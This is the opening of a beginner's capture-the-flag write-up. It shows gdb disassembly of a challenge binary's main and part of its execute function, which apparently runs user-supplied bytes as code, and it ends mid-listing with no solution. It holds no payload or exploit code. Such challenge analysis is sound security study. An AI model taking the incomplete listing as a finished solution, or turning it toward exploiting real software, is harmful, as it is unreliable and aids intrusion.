<html><head><style>body {
   color: black;
}
</style></head><body><p>Hey this is my first Writeup i try to explain as detailed as posible what i did to solve this challenge.
Special thanks to @Zopazz and @uncle_Jeff from the PWNFunction Discord for helping me out and answering my stupid questions :D
Join us if u want <a href="https://discord.gg/qJzgHZ5srj">https://discord.gg/qJzgHZ5srj</a>.</p>
<p>Run <code>gdb ./fun</code> and than <code>disass main</code></p>
<pre><code>   <span class="hljs-number">0x080485d3</span> &lt;+<span class="hljs-number">0</span>&gt;:     <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">ecx</span>,[<span class="hljs-built_in">esp</span>+<span class="hljs-number">0x4</span>]
   <span class="hljs-number">0x080485d7</span> &lt;+<span class="hljs-number">4</span>&gt;:     <span class="hljs-keyword">and</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0xfffffff0</span>
   <span class="hljs-number">0x080485da</span> &lt;+<span class="hljs-number">7</span>&gt;:     <span class="hljs-keyword">push</span>   <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ecx</span>-<span class="hljs-number">0x4</span>]
   <span class="hljs-number">0x080485dd</span> &lt;+<span class="hljs-number">10</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-built_in">ebp</span>
   <span class="hljs-number">0x080485de</span> &lt;+<span class="hljs-number">11</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">esp</span>
   <span class="hljs-number">0x080485e0</span> &lt;+<span class="hljs-number">13</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-built_in">ebx</span>
   <span class="hljs-number">0x080485e1</span> &lt;+<span class="hljs-number">14</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-built_in">ecx</span>
   <span class="hljs-number">0x080485e2</span> &lt;+<span class="hljs-number">15</span>&gt;:    <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x3f0</span>
   <span class="hljs-number">0x080485e8</span> &lt;+<span class="hljs-number">21</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x8048430</span> &lt;__x86.get_pc_thunk.bx&gt;
   <span class="hljs-number">0x080485ed</span> &lt;+<span class="hljs-number">26</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">ebx</span>,<span class="hljs-number">0x1a13</span>
   <span class="hljs-number">0x080485f3</span> &lt;+<span class="hljs-number">32</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebx</span>-<span class="hljs-number">0x4</span>]
   <span class="hljs-number">0x080485f9</span> &lt;+<span class="hljs-number">38</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">eax</span>]
   <span class="hljs-number">0x080485fb</span> &lt;+<span class="hljs-number">40</span>&gt;:    <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x8</span>
   <span class="hljs-number">0x080485fe</span> &lt;+<span class="hljs-number">43</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-number">0x0</span>
   <span class="hljs-number">0x08048600</span> &lt;+<span class="hljs-number">45</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x08048601</span> &lt;+<span class="hljs-number">46</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x8048380</span> &lt;setbuf@plt&gt;
   <span class="hljs-number">0x08048606</span> &lt;+<span class="hljs-number">51</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>
   <span class="hljs-number">0x08048609</span> &lt;+<span class="hljs-number">54</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>],<span class="hljs-number">0x0</span>
   <span class="hljs-number">0x08048610</span> &lt;+<span class="hljs-number">61</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xd</span>],<span class="hljs-number">0x0</span>
   <span class="hljs-number">0x08048614</span> &lt;+<span class="hljs-number">65</span>&gt;:    <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0xc</span>
   <span class="hljs-number">0x08048617</span> &lt;+<span class="hljs-number">68</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">eax</span>,[<span class="hljs-built_in">ebx</span>-<span class="hljs-number">0x18c0</span>]
   <span class="hljs-number">0x0804861d</span> &lt;+<span class="hljs-number">74</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x0804861e</span> &lt;+<span class="hljs-number">75</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x8048390</span> &lt;puts@plt&gt;
   <span class="hljs-number">0x08048623</span> &lt;+<span class="hljs-number">80</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>
   <span class="hljs-number">0x08048626</span> &lt;+<span class="hljs-number">83</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebx</span>-<span class="hljs-number">0x8</span>]
   <span class="hljs-number">0x0804862c</span> &lt;+<span class="hljs-number">89</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">eax</span>]
   <span class="hljs-number">0x0804862e</span> &lt;+<span class="hljs-number">91</span>&gt;:    <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0xc</span>
   <span class="hljs-number">0x08048631</span> &lt;+<span class="hljs-number">94</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x08048632</span> &lt;+<span class="hljs-number">95</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x80483c0</span> &lt;fgetc@plt&gt;
   <span class="hljs-number">0x08048637</span> &lt;+<span class="hljs-number">100</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>
   <span class="hljs-number">0x0804863a</span> &lt;+<span class="hljs-number">103</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xd</span>],<span class="hljs-built_in">al</span>
   <span class="hljs-number">0x0804863d</span> &lt;+<span class="hljs-number">106</span>&gt;:   <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x804866b</span> &lt;main+<span class="hljs-number">152</span>&gt;
   <span class="hljs-number">0x0804863f</span> &lt;+<span class="hljs-number">108</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">edx</span>,[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x3f5</span>]
   <span class="hljs-number">0x08048645</span> &lt;+<span class="hljs-number">114</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>]
   <span class="hljs-number">0x08048648</span> &lt;+<span class="hljs-number">117</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x0804864a</span> &lt;+<span class="hljs-number">119</span>&gt;:   <span class="hljs-keyword">movzx</span>  <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xd</span>]
   <span class="hljs-number">0x0804864e</span> &lt;+<span class="hljs-number">123</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">edx</span>],<span class="hljs-built_in">al</span>
   <span class="hljs-number">0x08048650</span> &lt;+<span class="hljs-number">125</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebx</span>-<span class="hljs-number">0x8</span>]
   <span class="hljs-number">0x08048656</span> &lt;+<span class="hljs-number">131</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">eax</span>]
   <span class="hljs-number">0x08048658</span> &lt;+<span class="hljs-number">133</span>&gt;:   <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0xc</span>
   <span class="hljs-number">0x0804865b</span> &lt;+<span class="hljs-number">136</span>&gt;:   <span class="hljs-keyword">push</span>   <span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x0804865c</span> &lt;+<span class="hljs-number">137</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x80483c0</span> &lt;fgetc@plt&gt;
   <span class="hljs-number">0x08048661</span> &lt;+<span class="hljs-number">142</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>
   <span class="hljs-number">0x08048664</span> &lt;+<span class="hljs-number">145</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xd</span>],<span class="hljs-built_in">al</span>
   <span class="hljs-number">0x08048667</span> &lt;+<span class="hljs-number">148</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>],<span class="hljs-number">0x1</span>
   <span class="hljs-number">0x0804866b</span> &lt;+<span class="hljs-number">152</span>&gt;:   <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xd</span>],<span class="hljs-number">0xa</span>
   <span class="hljs-number">0x0804866f</span> &lt;+<span class="hljs-number">156</span>&gt;:   <span class="hljs-keyword">je</span>     <span class="hljs-number">0x804867a</span> &lt;main+<span class="hljs-number">167</span>&gt;
   <span class="hljs-number">0x08048671</span> &lt;+<span class="hljs-number">158</span>&gt;:   <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>],<span class="hljs-number">0x3e7</span>
   <span class="hljs-number">0x08048678</span> &lt;+<span class="hljs-number">165</span>&gt;:   <span class="hljs-keyword">jbe</span>    <span class="hljs-number">0x804863f</span> &lt;main+<span class="hljs-number">108</span>&gt;
   <span class="hljs-number">0x0804867a</span> &lt;+<span class="hljs-number">167</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>]
   <span class="hljs-number">0x0804867d</span> &lt;+<span class="hljs-number">170</span>&gt;:   <span class="hljs-keyword">and</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x1</span>
   <span class="hljs-number">0x08048680</span> &lt;+<span class="hljs-number">173</span>&gt;:   <span class="hljs-keyword">test</span>   <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x08048682</span> &lt;+<span class="hljs-number">175</span>&gt;:   <span class="hljs-keyword">je</span>     <span class="hljs-number">0x8048696</span> &lt;main+<span class="hljs-number">195</span>&gt;
   <span class="hljs-number">0x08048684</span> &lt;+<span class="hljs-number">177</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">edx</span>,[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x3f5</span>]
   <span class="hljs-number">0x0804868a</span> &lt;+<span class="hljs-number">183</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>]
   <span class="hljs-number">0x0804868d</span> &lt;+<span class="hljs-number">186</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">edx</span>
   <span class="hljs-number">0x0804868f</span> &lt;+<span class="hljs-number">188</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">eax</span>],<span class="hljs-number">0x90</span>
   <span class="hljs-number">0x08048692</span> &lt;+<span class="hljs-number">191</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>],<span class="hljs-number">0x1</span>
   <span class="hljs-number">0x08048696</span> &lt;+<span class="hljs-number">195</span>&gt;:   <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x8</span>
   <span class="hljs-number">0x08048699</span> &lt;+<span class="hljs-number">198</span>&gt;:   <span class="hljs-keyword">push</span>   <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>]
   <span class="hljs-number">0x0804869c</span> &lt;+<span class="hljs-number">201</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">eax</span>,[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x3f5</span>]
   <span class="hljs-number">0x080486a2</span> &lt;+<span class="hljs-number">207</span>&gt;:   <span class="hljs-keyword">push</span>   <span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x080486a3</span> &lt;+<span class="hljs-number">208</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x80484f6</span> &lt;execute&gt;
   <span class="hljs-number">0x080486a8</span> &lt;+<span class="hljs-number">213</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span>
   <span class="hljs-number">0x080486ab</span> &lt;+<span class="hljs-number">216</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span>
   <span class="hljs-number">0x080486b0</span> &lt;+<span class="hljs-number">221</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">esp</span>,[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8</span>]
   <span class="hljs-number">0x080486b3</span> &lt;+<span class="hljs-number">224</span>&gt;:   <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">ecx</span>
   <span class="hljs-number">0x080486b4</span> &lt;+<span class="hljs-number">225</span>&gt;:   <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">ebx</span>
   <span class="hljs-number">0x080486b5</span> &lt;+<span class="hljs-number">226</span>&gt;:   <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">ebp</span>
   <span class="hljs-number">0x080486b6</span> &lt;+<span class="hljs-number">227</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">esp</span>,[<span class="hljs-built_in">ecx</span>-<span class="hljs-number">0x4</span>]
   <span class="hljs-number">0x080486b9</span> &lt;+<span class="hljs-number">230</span>&gt;:   <span class="hljs-keyword">ret</span>
</code></pre><p><code>0x080486a3 &lt;+208&gt;:   call   0x80484f6 &lt;execute&gt;</code> this looks interesting because its not a function from the .plt so it is not a linked function.</p>
<p>lets check it with <code>disass execute</code></p>
<pre><code>   <span class="hljs-number">0x080484f6</span> &lt;+<span class="hljs-number">0</span>&gt;:     <span class="hljs-keyword">push</span>   <span class="hljs-built_in">ebp</span>
   <span class="hljs-number">0x080484f7</span> &lt;+<span class="hljs-number">1</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">esp</span>
   <span class="hljs-number">0x080484f9</span> &lt;+<span class="hljs-number">3</span>&gt;:     <span class="hljs-keyword">push</span>   <span class="hljs-built_in">ebx</span>
   <span class="hljs-number">0x080484fa</span> &lt;+<span class="hljs-number">4</span>&gt;:     <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x24</span>
   <span class="hljs-number">0x080484fd</span> &lt;+<span class="hljs-number">7</span>&gt;:     <span class="hljs-keyword">call</span>   <span class="hljs-number">0x80486ba</span> &lt;__x86.get_pc_thunk.ax&gt;
   <span class="hljs-number">0x08048502</span> &lt;+<span class="hljs-number">12</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x1afe</span>
   <span class="hljs-number">0x08048507</span> &lt;+<span class="hljs-number">17</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">esp</span>
   <span class="hljs-number">0x08048509</span> &lt;+<span class="hljs-number">19</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">edx</span>
   <span class="hljs-number">0x0804850b</span> &lt;+<span class="hljs-number">21</span>&gt;:    <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">0x8</span>],<span class="hljs-number">0x0</span>
   <span class="hljs-number">0x0804850f</span> &lt;+<span class="hljs-number">25</span>&gt;:    <span class="hljs-keyword">je</span>     <span class="hljs-number">0x8048517</span> &lt;execute+<span class="hljs-number">33</span>&gt;
   <span class="hljs-number">0x08048511</span> &lt;+<span class="hljs-number">27</span>&gt;:    <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">0xc</span>],<span class="hljs-number">0x0</span>
   <span class="hljs-number">0x08048515</span> &lt;+<span class="hljs-number">31</span>&gt;:    <span class="hljs-keyword">jne</span>    <span class="hljs-number">0x8048523</span> &lt;execute+<span class="hljs-number">45</span>&gt;
   <span class="hljs-number">0x08048517</span> &lt;+<span class="hljs-number">33</span>&gt;:    <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0xc</span>
   <span class="hljs-number">0x0804851a</span> &lt;+<span class="hljs-number">36</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-number">0x1</span>
   <span class="hljs-number">0x0804851c</span> &lt;+<span class="hljs-number">38</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x0804851e</span> &lt;+<span class="hljs-number">40</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x80483a0</span> &lt;exit@plt&gt;
   <span class="hljs-number">0x08048523</span> &lt;+<span class="hljs-number">45</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">0xc</span>]
   <span class="hljs-number">0x08048526</span> &lt;+<span class="hljs-number">48</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x08048528</span> &lt;+<span class="hljs-number">50</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x14</span>],<span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x0804852b</span> &lt;+<span class="hljs-number">53</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x14</span>]
   <span class="hljs-number">0x0804852e</span> &lt;+<span class="hljs-number">56</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x1</span>
   <span class="hljs-number">0x08048531</span> &lt;+<span class="hljs-number">59</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x08048533</span> &lt;+<span class="hljs-number">61</span>&gt;:    <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-number">0x1</span>
   <span class="hljs-number">0x08048536</span> &lt;+<span class="hljs-number">64</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x18</span>],<span class="hljs-built_in">edx</span>
   <span class="hljs-number">0x08048539</span> &lt;+<span class="hljs-number">67</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-number">0x10</span>
   <span class="hljs-number">0x0804853e</span> &lt;+<span class="hljs-number">72</span>&gt;:    <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-number">0x1</span>
   <span class="hljs-number">0x08048541</span> &lt;+<span class="hljs-number">75</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">edx</span>
   <span class="hljs-number">0x08048543</span> &lt;+<span class="hljs-number">77</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ecx</span>,<span class="hljs-number">0x10</span>
   <span class="hljs-number">0x08048548</span> &lt;+<span class="hljs-number">82</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-number">0x0</span>
   <span class="hljs-number">0x0804854d</span> &lt;+<span class="hljs-number">87</span>&gt;:    <span class="hljs-keyword">div</span>    <span class="hljs-built_in">ecx</span>
   <span class="hljs-number">0x0804854f</span> &lt;+<span class="hljs-number">89</span>&gt;:    <span class="hljs-keyword">imul</span>   <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span>,<span class="hljs-number">0x10</span>
   <span class="hljs-number">0x08048552</span> &lt;+<span class="hljs-number">92</span>&gt;:    <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x08048554</span> &lt;+<span class="hljs-number">94</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">esp</span>
   <span class="hljs-number">0x08048556</span> &lt;+<span class="hljs-number">96</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span>
   <span class="hljs-number">0x08048559</span> &lt;+<span class="hljs-number">99</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x1c</span>],<span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x0804855c</span> &lt;+<span class="hljs-number">102</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x10</span>],<span class="hljs-number">0x0</span>
   <span class="hljs-number">0x08048563</span> &lt;+<span class="hljs-number">109</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>],<span class="hljs-number">0x0</span>
   <span class="hljs-number">0x0804856a</span> &lt;+<span class="hljs-number">116</span>&gt;:   <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x80485ad</span> &lt;execute+<span class="hljs-number">183</span>&gt;
   <span class="hljs-number">0x0804856c</span> &lt;+<span class="hljs-number">118</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>]
   <span class="hljs-number">0x0804856f</span> &lt;+<span class="hljs-number">121</span>&gt;:   <span class="hljs-keyword">cdq</span>    
   <span class="hljs-number">0x08048570</span> &lt;+<span class="hljs-number">122</span>&gt;:   <span class="hljs-keyword">shr</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-number">0x1e</span>
   <span class="hljs-number">0x08048573</span> &lt;+<span class="hljs-number">125</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">edx</span>
   <span class="hljs-number">0x08048575</span> &lt;+<span class="hljs-number">127</span>&gt;:   <span class="hljs-keyword">and</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x3</span>
   <span class="hljs-number">0x08048578</span> &lt;+<span class="hljs-number">130</span>&gt;:   <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">edx</span>
   <span class="hljs-number">0x0804857a</span> &lt;+<span class="hljs-number">132</span>&gt;:   <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x1</span>
   <span class="hljs-number">0x0804857d</span> &lt;+<span class="hljs-number">135</span>&gt;:   <span class="hljs-keyword">jg</span>     <span class="hljs-number">0x804859e</span> &lt;execute+<span class="hljs-number">168</span>&gt;
   <span class="hljs-number">0x0804857f</span> &lt;+<span class="hljs-number">137</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x10</span>]
   <span class="hljs-number">0x08048582</span> &lt;+<span class="hljs-number">140</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">edx</span>,[<span class="hljs-built_in">eax</span>+<span class="hljs-number">0x1</span>]
   <span class="hljs-number">0x08048585</span> &lt;+<span class="hljs-number">143</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x10</span>],<span class="hljs-built_in">edx</span>
   <span class="hljs-number">0x08048588</span> &lt;+<span class="hljs-number">146</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x0804858a</span> &lt;+<span class="hljs-number">148</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">0x8</span>]
   <span class="hljs-number">0x0804858d</span> &lt;+<span class="hljs-number">151</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">edx</span>
   <span class="hljs-number">0x0804858f</span> &lt;+<span class="hljs-number">153</span>&gt;:   <span class="hljs-keyword">movzx</span>  <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">eax</span>]
   <span class="hljs-number">0x08048592</span> &lt;+<span class="hljs-number">156</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x1c</span>]
   <span class="hljs-number">0x08048595</span> &lt;+<span class="hljs-number">159</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>]
   <span class="hljs-number">0x08048598</span> &lt;+<span class="hljs-number">162</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">ecx</span>
   <span class="hljs-number">0x0804859a</span> &lt;+<span class="hljs-number">164</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">edx</span>],<span class="hljs-built_in">al</span>
   <span class="hljs-number">0x0804859c</span> &lt;+<span class="hljs-number">166</span>&gt;:   <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x80485a9</span> &lt;execute+<span class="hljs-number">179</span>&gt;
